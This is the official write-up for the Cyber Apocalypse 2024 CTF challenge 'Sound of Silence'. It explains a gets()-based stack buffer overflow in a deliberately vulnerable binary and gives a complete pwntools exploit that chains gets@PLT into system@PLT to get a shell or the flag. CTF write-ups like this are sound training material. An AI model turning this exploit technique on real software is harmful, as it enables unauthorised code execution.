---
title: "[Medium] Sound of Silence - cyber apocalypse 2024"
category: "pwn"
subcategory: "stack"
type: "writeup"
tags: ["pwn", "buffer-overflow", "ret2libc", "canary", "pie", "pwndbg", "checksec", "gets", "os-system"]
summary: "​  28 th  January 2024 / Document No."
source:
  name: "hackthebox/cyber-apocalypse-2024"
  url: "https://github.com/hackthebox/cyber-apocalypse-2024/blob/4e59eec7a4919d2a4ae4f5d98ecf8ba153ac464a/pwn/%5BMedium%5D%20Sound%20of%20Silence/README.md"
ctf:
  name: "cyber apocalypse"
  year: 2024
  challenge: "[Medium] Sound of Silence"
---

## Source

- **CTF:** cyber apocalypse 2024
- **Challenge:** [Medium] Sound of Silence
- **Repository:** [hackthebox/cyber-apocalypse-2024](https://github.com/hackthebox/cyber-apocalypse-2024)
- **File:** <https://github.com/hackthebox/cyber-apocalypse-2024/blob/4e59eec7a4919d2a4ae4f5d98ecf8ba153ac464a/pwn/%5BMedium%5D%20Sound%20of%20Silence/README.md>

---
![](https://raw.githubusercontent.com/hackthebox/cyber-apocalypse-2024/4e59eec7a4919d2a4ae4f5d98ecf8ba153ac464a/pwn/[Medium]%20Sound%20of%20Silence/assets/banner.png)



<img src="https://raw.githubusercontent.com/hackthebox/cyber-apocalypse-2024/4e59eec7a4919d2a4ae4f5d98ecf8ba153ac464a/pwn/[Medium]%20Sound%20of%20Silence/assets/htb.png" style="margin-left: 20px; zoom: 80%;" align=left />    	<font size="10">Sound of Silence</font>

​		28<sup>th</sup> January 2024 / Document No. DYY.102.XX

​		Prepared By: w3th4nds

​		Challenge Author(s): w3th4nds

​		Difficulty: <font color=green>Easy</font>

​		Classification: Official

 



# Synopsis

Sound of Silence is an easy difficulty challenge that features Buffer Overflow, calling the `gets` function to take as argument `system@PLT` and then enter there the string `bin0sh` to spawn shell. `ret2libc` or other techniques are not available because there is no function to print to `stdout`.

# Description

Navigate the shadows in a dimly lit room, silently evading detection as you strategize to outsmart your foes. Employ clever distractions to divert their attention, paving the way for your daring escape!

## Skills Required

- Basic `ROP`.

## Skills Learned

- Call `gets` with `system` as argument.

# Enumeration

First of all, we start with a `checksec`:  

```console
pwndbg> checksec
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### Protections 🛡️

As we can see:

| Protection | Enabled  | Usage   | 
| :---:      | :---:    | :---:   |
| **Canary** | ❌       | Prevents **Buffer Overflows**  |
| **NX**     | ✅       | Disables **code execution** on stack |
| **PIE**    | ❌       | Randomizes the **base address** of the binary | 
| **RelRO**  | **Full** | Makes some binary sections **read-only** |

The program's interface 

```console
~The Sound of Silence is mesmerising~

>> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[1]    212434 segmentation fault (core dumped)  ./sound_of_silence
```

As we can see, the program is pretty straightforward. It asks for input and then it `SegFaults` after `40` bytes. This seems like a very easy challenge, but the tricky part is that there are no functions to print to `stdout` to leak any addresses and perform classic `ROP` techniques.

### Disassembly

Starting with `main()`:

```c
void main(void)

{
  char local_28 [32];
  
  system("clear && echo -n \'~The Sound of Silence is mesmerising~\n\n>> \'");
  gets(local_28);
  return;
}
```

The program is really simple. There is an obvious `Buffer Overflow` with `gets(local_28)`. The only other function we can use it `system`. 

### Exploitation Path

We will overwrite the `return address` with the address of `gets@PLT` and we will pass as argument the address of `system@PLT`. Then, whatever we enter, will be the argument of `system`. It's obvious that we will enter the string `/bin/sh` in there to spawn shell. The character `/` is converted so instead of this, we will use `0`. On the other hand, we can skip shell and just call `system("cat flag*");`. The same issues occurs so we use `cat glag*` instead.

# Solution

```python
#!/usr/bin/python3.8
from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.arch = 'amd64'
context.log_level = 'critical'

fname = './sound_of_silence' 

LOCAL = False

os.system('clear')

if LOCAL:
  print('Running solver locally..\n')
  r    = process(fname)
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
  r    = remote(IP, PORT)
  print(f'Running solver remotely at {IP} {PORT}\n')

e = ELF(fname)

payload = flat({0x28: p64(e.plt.gets) + p64(e.plt.system)})

r.sendlineafter('>> ', payload)

r.sendline('cat glag*')

print(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}\n')
```

```console
Running solver remotely at 0.0.0.0 1337

Flag --> HTB{n0_n33d_4_l34k5_wh3n_u_h4v3_5y5t3m}
```
